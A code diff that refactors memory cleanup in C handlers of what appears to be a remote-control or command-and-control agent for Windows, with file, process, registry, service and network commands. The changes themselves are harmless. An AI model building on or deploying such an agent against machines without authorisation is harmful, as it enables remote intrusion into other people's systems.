@@ -72,15 +72,10 @@ CLEANUP:
 		FREE(pTemp);
 	}
 
-	if (lpNewPath != NULL) {
-		FREE(lpNewPath);
-	}
-
-	if (lpRespData != NULL) {
-		FREE(lpRespData);
-	}
-
+	FREE(lpNewPath);
+	FREE(lpRespData);
 	FreeElement(pElement);
+
 	return pRespEnvelope;
 }
 
@@ -269,34 +264,13 @@ CLEANUP:
 		FREE(UnmarshalledData);
 	}
 
-	if (pOutputBuffer != NULL) {
-		FREE(pOutputBuffer);
-	}
-
-	if (pErrorBuffer != NULL) {
-		FREE(pErrorBuffer);
-	}
-
-	if (lpPath != NULL) {
-		FREE(lpPath);
-	}
-
-	if (lpCommandLine != NULL) {
-		FREE(lpCommandLine);
-	}
-
-	if (lpStdOutPath != NULL) {
-		FREE(lpStdOutPath);
-	}
-
-	if (lpStdErrPath != NULL) {
-		FREE(lpStdErrPath);
-	}
-
-	if (StartupInfo.lpAttributeList != NULL) {
-		FREE(StartupInfo.lpAttributeList);
-	}
-
+	FREE(pOutputBuffer);
+	FREE(pErrorBuffer);
+	FREE(lpPath);
+	FREE(lpCommandLine);
+	FREE(lpStdOutPath);
+	FREE(lpStdErrPath);
+	FREE(StartupInfo.lpAttributeList);
 	if (hParentProcess != NULL) {
 		CloseHandle(hParentProcess);
 	}
@@ -400,19 +374,11 @@ CLEANUP:
 		FreeElement(RecvElementList[i]);
 	}
 
-	if (lpPath != NULL) {
-		FREE(lpPath);
-	}
-
-	if (lpTempStr != NULL) {
-		FREE(lpTempStr);
-	}
-
-	if (lpZipPath != NULL) {
-		FREE(lpZipPath);
-	}
-
+	FREE(lpPath);
+	FREE(lpTempStr);
+	FREE(lpZipPath);
 	FreeBuffer(pData);
+
 	return pRespEnvelope;
 }
 
@@ -475,18 +441,9 @@ CLEANUP:
 		FREE(UnmarshalledData);
 	}
 
-	if (lpPath != NULL) {
-		FREE(lpPath);
-	}
-
-	if (lpTempStr != NULL) {
-		FREE(lpTempStr);
-	}
-
-	if (lpZipPath != NULL) {
-		FREE(lpZipPath);
-	}
-
+	FREE(lpPath);
+	FREE(lpTempStr);
+	FREE(lpZipPath);
 	FreeElement(pRecvElement);
 	FreeElement(pFinalElement);
 	FreeBuffer(pData);
@@ -535,10 +492,7 @@ CLEANUP:
 		FREE(pTemp);
 	}
 
-	if (lpPath != NULL) {
-		FREE(lpPath);
-	}
-
+	FREE(lpPath);
 	FreeElement(pElement);
 	return pRespEnvelope;
 }
@@ -627,23 +581,14 @@ PENVELOPE RmHandler
 	pRespEnvelope->pData = BufferMove(RespElement->pMarshalledData, RespElement->cbMarshalledData);
 	RespElement->pMarshalledData = NULL;
 CLEANUP:
-	if (ShFileStruct.pFrom != NULL) {
-		FREE(ShFileStruct.pFrom);
-	}
-
+	FREE(ShFileStruct.pFrom);
 	if (pTemp != NULL) {
 		FreeBuffer(pTemp[0]);
 		FREE(pTemp);
 	}
 
-	if (lpConvertedPath != NULL) {
-		FREE(lpConvertedPath);
-	}
-
-	if (lpRespData != NULL) {
-		FREE(lpRespData);
-	}
-
+	FREE(lpConvertedPath);
+	FREE(lpRespData);
 	for (i = 0; i < _countof(Element); i++) {
 		FreeElement(Element[i]);
 	}
@@ -691,28 +636,16 @@ PENVELOPE MvHandler
 	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
 	pRespEnvelope->uID = pEnvelope->uID;
 CLEANUP:
-	if (ShFileStruct.pFrom != NULL) {
-		FREE(ShFileStruct.pFrom);
-	}
-
-	if (ShFileStruct.pTo != NULL) {
-		FREE(ShFileStruct.pTo);
-	}
-
+	FREE(ShFileStruct.pFrom);
+	FREE(ShFileStruct.pTo);
 	if (pTemp != NULL) {
 		FreeBuffer(pTemp[0]);
 		FreeBuffer(pTemp[1]);
 		FREE(pTemp);
 	}
 
-	if (lpSrc != NULL) {
-		FREE(lpSrc);
-	}
-
-	if (lpDest != NULL) {
-		FREE(lpDest);
-	}
-
+	FREE(lpSrc);
+	FREE(lpDest);
 	for (i = 0; i < _countof(Element); i++) {
 		FreeElement(Element[i]);
 	}
@@ -768,28 +701,16 @@ PENVELOPE CpHandler
 	pRespEnvelope->pData = BufferMove(RespElement->pMarshalledData, RespElement->cbMarshalledData);
 	RespElement->pMarshalledData = NULL;
 CLEANUP:
-	if (ShFileStruct.pFrom != NULL) {
-		FREE(ShFileStruct.pFrom);
-	}
-
-	if (ShFileStruct.pTo != NULL) {
-		FREE(ShFileStruct.pTo);
-	}
-
+	FREE(ShFileStruct.pFrom);
+	FREE(ShFileStruct.pTo);
 	if (pTemp != NULL) {
 		FreeBuffer(pTemp[0]);
 		FreeBuffer(pTemp[1]);
 		FREE(pTemp);
 	}
 
-	if (lpSrc != NULL) {
-		FREE(lpSrc);
-	}
-
-	if (lpDest != NULL) {
-		FREE(lpDest);
-	}
-
+	FREE(lpSrc);
+	FREE(lpDest);
 	for (i = 0; i < _countof(Element); i++) {
 		FreeElement(Element[i]);
 	}
@@ -822,10 +743,7 @@ PENVELOPE PwdHandler
 	pRespEnvelope->pData = BufferMove(pElement->pMarshalledData, pElement->cbMarshalledData);
 	pElement->pMarshalledData = NULL;
 CLEANUP:
-	if (lpRespData != NULL) {
-		FREE(lpRespData);
-	}
-
+	FREE(lpRespData);
 	FreeElement(pElement);
 
 	return pRespEnvelope;
@@ -1120,33 +1038,13 @@ PENVELOPE IfconfigHandler
 	pElement->pMarshalledData = NULL;
 CLEANUP:
 	FreeElement(pElement);
-	if (pTemp != NULL) {
-		FREE(pTemp);
-	}
-
-	if (lpHostName != NULL) {
-		FREE(lpHostName);
-	}
-
-	if (lpPrimaryDnsSuffix != NULL) {
-		FREE(lpPrimaryDnsSuffix);
-	}
-
-	if (pFixedInfo != NULL) {
-		FREE(pFixedInfo);
-	}
-
-	if (lpNodeType != NULL) {
-		FREE(lpNodeType);
-	}
-
-	if (lpDhcpServer != NULL) {
-		FREE(lpDhcpServer);
-	}
-
-	if (lpRespData != NULL) {
-		FREE(lpRespData);
-	}
+	FREE(pTemp);
+	FREE(lpHostName);
+	FREE(lpPrimaryDnsSuffix);
+	FREE(pFixedInfo);
+	FREE(lpNodeType);
+	FREE(lpDhcpServer);
+	FREE(lpRespData);
 
 	return pRespEnvelope;
 }
@@ -1204,18 +1102,9 @@ VOID FreeFileInfo
 )
 {
 	if (pFileInfo != NULL) {
-		if (pFileInfo->lpName != NULL) {
-			FREE(pFileInfo->lpName);
-		}
-
-		if (pFileInfo->lpOwner != NULL) {
-			FREE(pFileInfo->lpOwner);
-		}
-
-		if (pFileInfo->lpLinkPath != NULL) {
-			FREE(pFileInfo->lpLinkPath);
-		}
-
+		FREE(pFileInfo->lpName);
+		FREE(pFileInfo->lpOwner);
+		FREE(pFileInfo->lpLinkPath);
 		FREE(pFileInfo);
 	}
 }
@@ -1330,18 +1219,9 @@ CLEANUP:
 		FREE(UnmarshalledData);
 	}
 
-	if (lpPath != NULL) {
-		FREE(lpPath);
-	}
-
-	if (pElementList != NULL) {
-		FREE(pElementList);
-	}
-
-	if (lpConvertedPath != NULL) {
-		FREE(lpConvertedPath);
-	}
-
+	FREE(lpPath);
+	FREE(pElementList);
+	FREE(lpConvertedPath);
 	if (FileList != NULL) {
 		for (i = 0; i < dwNumberOfItems; i++) {
 			FreeFileInfo(FileList[i]);
@@ -1350,10 +1230,7 @@ CLEANUP:
 		FREE(FileList);
 	}
 
-	if (lpFullPath != NULL) {
-		FREE(lpFullPath);
-	}
-
+	FREE(lpFullPath);
 	FreeElement(pRecvElement);
 	FreeElement(pFinalElement);
 
@@ -1611,22 +1488,10 @@ CLEANUP:
 		FREE(UnmarshalledData);
 	}
 
-	if (lpPath != NULL) {
-		FREE(lpPath);
-	}
-
-	if (pAcl != NULL) {
-		FREE(pAcl);
-	}
-
-	if (lpTempPath != NULL) {
-		FREE(lpTempPath);
-	}
-
-	if (lpRespData != NULL) {
-		FREE(lpRespData);
-	}
-
+	FREE(lpPath);
+	FREE(pAcl);
+	FREE(lpTempPath);
+	FREE(lpRespData);
 	FreeElement(pRecvElement);
 	FreeElement(pFinalElement);
 
@@ -1851,22 +1716,10 @@ PENVELOPE PsHandler
 	pRespEnvelope->pData = BufferMove(pFinalElement->pMarshalledData, pFinalElement->cbMarshalledData);
 	pFinalElement->pMarshalledData = NULL;
 CLEANUP:
-	if (pUnmarshalledPid != NULL) {
-		FREE(pUnmarshalledPid);
-	}
-
-	if (pReceivedElement != NULL) {
-		FREE(pReceivedElement);
-	}
-
-	if (pElementList2 != NULL) {
-		FREE(pElementList2);
-	}
-
-	if (pProcesses != NULL) {
-		FREE(pProcesses);
-	}
-
+	FREE(pUnmarshalledPid);
+	FREE(pReceivedElement);
+	FREE(pElementList2);
+	FREE(pProcesses);
 	FreeElement(pFinalElement);
 
 	return pRespEnvelope;
@@ -1915,10 +1768,7 @@ PENVELOPE TerminateHandler
 	pRespEnvelope->pData = BufferMove(pFinalElement->pMarshalledData, pFinalElement->cbMarshalledData);
 	pFinalElement->pMarshalledData = NULL;
 CLEANUP:
-	if (UnmarshalledData != NULL) {
-		FREE(UnmarshalledData);
-	}
-
+	FREE(UnmarshalledData);
 	for (i = 0; i < _countof(RecvElementList); i++) {
 		FreeElement(RecvElementList[i]);
 	}
@@ -2206,30 +2056,15 @@ CLEANUP:
 		FreeElement(RecvElementList[i]);
 	}
 
-	if (pData != NULL) {
-		FREE(pData);
-	}
-
+	FREE(pData);
 	if (hKey != NULL) {
 		RegCloseKey(hKey);
 	}
 
-	if (lpFormattedValue != NULL) {
-		FREE(lpFormattedValue);
-	}
-
-	if (lpPath != NULL) {
-		FREE(lpPath);
-	}
-
-	if (lpHive != NULL) {
-		FREE(lpHive);
-	}
-
-	if (lpValueName != NULL) {
-		FREE(lpValueName);
-	}
-
+	FREE(lpFormattedValue);
+	FREE(lpPath);
+	FREE(lpHive);
+	FREE(lpValueName);
 	FreeElement(pFinalElement);
 
 	return pRespEnvelope;
@@ -2347,7 +2182,7 @@ PENVELOPE RegistryWriteHandler
 		FREE(lpValueName);
 		lpValueName = NULL;
 		if (dwValueType != REG_SZ) {
-			LogError("Cannot assign this registry type to default key value\n");
+			LogError(L"Cannot assign this registry type to default key value\n");
 			goto CLEANUP;
 		}
 	}
@@ -2387,22 +2222,10 @@ CLEANUP:
 		RegCloseKey(hKey);
 	}
 
-	if (lpPath != NULL) {
-		FREE(lpPath);
-	}
-
-	if (lpHive != NULL) {
-		FREE(lpHive);
-	}
-
-	if (lpValueName != NULL) {
-		FREE(lpValueName);
-	}
-
-	if (pValue != NULL) {
-		FREE(pValue);
-	}
-
+	FREE(lpPath);
+	FREE(lpHive);
+	FREE(lpValueName);
+	FREE(pValue);
 	FreeElement(pFinalElement);
 
 	return pRespEnvelope;
@@ -2497,22 +2320,10 @@ CLEANUP:
 		RegCloseKey(hKey);
 	}
 
-	if (lpPath != NULL) {
-		FREE(lpPath);
-	}
-
-	if (lpHive != NULL) {
-		FREE(lpHive);
-	}
-
-	if (lpKeyName != NULL) {
-		FREE(lpKeyName);
-	}
-
-	if (lpTemp != NULL) {
-		FREE(lpTemp);
-	}
-
+	FREE(lpPath);
+	FREE(lpHive);
+	FREE(lpKeyName);
+	FREE(lpTemp);
 	FreeElement(pFinalElement);
 
 	return pRespEnvelope;
@@ -2634,26 +2445,11 @@ CLEANUP:
 		RegCloseKey(hKey);
 	}
 
-	if (lpPath != NULL) {
-		FREE(lpPath);
-	}
-
-	if (lpHive != NULL) {
-		FREE(lpHive);
-	}
-
-	if (lpValueName != NULL) {
-		FREE(lpValueName);
-	}
-
-	if (lpKeyName != NULL) {
-		FREE(lpKeyName);
-	}
-
-	if (lpTemp != NULL) {
-		FREE(lpTemp);
-	}
-
+	FREE(lpPath);
+	FREE(lpHive);
+	FREE(lpValueName);
+	FREE(lpKeyName);
+	FREE(lpTemp);
 	FreeElement(pFinalElement);
 
 	return pRespEnvelope;
@@ -2775,14 +2571,8 @@ CLEANUP:
 		RegCloseKey(hKey);
 	}
 
-	if (lpPath != NULL) {
-		FREE(lpPath);
-	}
-
-	if (lpHive != NULL) {
-		FREE(lpHive);
-	}
-
+	FREE(lpPath);
+	FREE(lpHive);
 	if (pSubKeys != NULL) {
 		for (i = 0; i < cSubKeys; i++) {
 			FreeBuffer(pSubKeys[i]);
@@ -2912,14 +2702,8 @@ CLEANUP:
 		RegCloseKey(hKey);
 	}
 
-	if (lpPath != NULL) {
-		FREE(lpPath);
-	}
-
-	if (lpHive != NULL) {
-		FREE(lpHive);
-	}
-
+	FREE(lpPath);
+	FREE(lpHive);
 	if (pValues != NULL) {
 		for (i = 0; i < cValues; i++) {
 			FreeBuffer(pValues[i]);
@@ -3010,14 +2794,8 @@ CLEANUP:
 		CloseServiceHandle(hScManager);
 	}
 
-	if (Services != NULL) {
-		FREE(Services);
-	}
-
-	if (ServiceList != NULL) {
-		FREE(ServiceList);
-	}
-
+	FREE(Services);
+	FREE(ServiceList);
 	FreeElement(pFinalElement);
 
 	return pRespEnvelope;
@@ -3112,10 +2890,7 @@ PENVELOPE ServiceDetailHandler
 	pFinalElement->pMarshalledData = NULL;
 
 CLEANUP:
-	if (lpServiceName != NULL) {
-		FREE(lpServiceName);
-	}
-
+	FREE(lpServiceName);
 	FreeElement(pRecvElement);
 	if (pServiceInfoReq != NULL) {
 		FreeBuffer(pServiceInfoReq[0][0]);
@@ -3124,22 +2899,13 @@ CLEANUP:
 		FREE(pServiceInfoReq);
 	}
 
-	if (lpServiceDesc != NULL) {
-		FREE(lpServiceDesc);
-	}
-
-	if (pServiceConfig != NULL) {
-		FREE(pServiceConfig);
-	}
-
+	FREE(lpServiceDesc);
+	FREE(pServiceConfig);
 	if (hScManager != NULL) {
 		CloseServiceHandle(hScManager);
 	}
 
-	if (lpServiceDisplayName != NULL) {
-		FREE(lpServiceDisplayName);
-	}
-
+	FREE(lpServiceDisplayName);
 	if (hService != NULL) {
 		CloseServiceHandle(hService);
 	}
@@ -3416,19 +3182,11 @@ CLEANUP:
 		FreeElement(RecvElementList[i]);
 	}
 
-	if (pNetState != NULL) {
-		FREE(pNetState);
-	}
-
-	if (pTemp != NULL) {
-		FREE(pTemp);
-	}
-
-	if (SockTabList != NULL) {
-		FREE(SockTabList);
-	}
-
+	FREE(pNetState);
+	FREE(pTemp);
+	FREE(SockTabList);
 	FreeElement(pFinalElement);
+
 	return pRespEnvelope;
 }
 
@@ -3470,15 +3228,10 @@ CLEANUP:
 		CloseHandle(hToken);
 	}
 
-	if (pTokenUser != NULL) {
-		FREE(pTokenUser);
-	}
-
-	if (lpTokenOwner != NULL) {
-		FREE(lpTokenOwner);
-	}
-
+	FREE(pTokenUser);
+	FREE(lpTokenOwner);
 	FreeElement(pFinalElement);
+
 	return pRespEnvelope;
 }
 
@@ -3566,23 +3319,12 @@ CLEANUP:
 		CloseHandle(hToken);
 	}
 
-	if (pTokenUser != NULL) {
-		FREE(pTokenUser);
-	}
-
-	if (PrivelegeList != NULL) {
-		FREE(PrivelegeList);
-	}
-
-	if (lpProcessIntegrity != NULL) {
-		FREE(lpProcessIntegrity);
-	}
-
-	if (pTokenPrivileges != NULL) {
-		FREE(pTokenPrivileges);
-	}
-
+	FREE(pTokenUser);
+	FREE(PrivelegeList);
+	FREE(lpProcessIntegrity);
+	FREE(pTokenPrivileges);
 	FreeElement(pFinalElement);
+
 	return pRespEnvelope;
 }
 
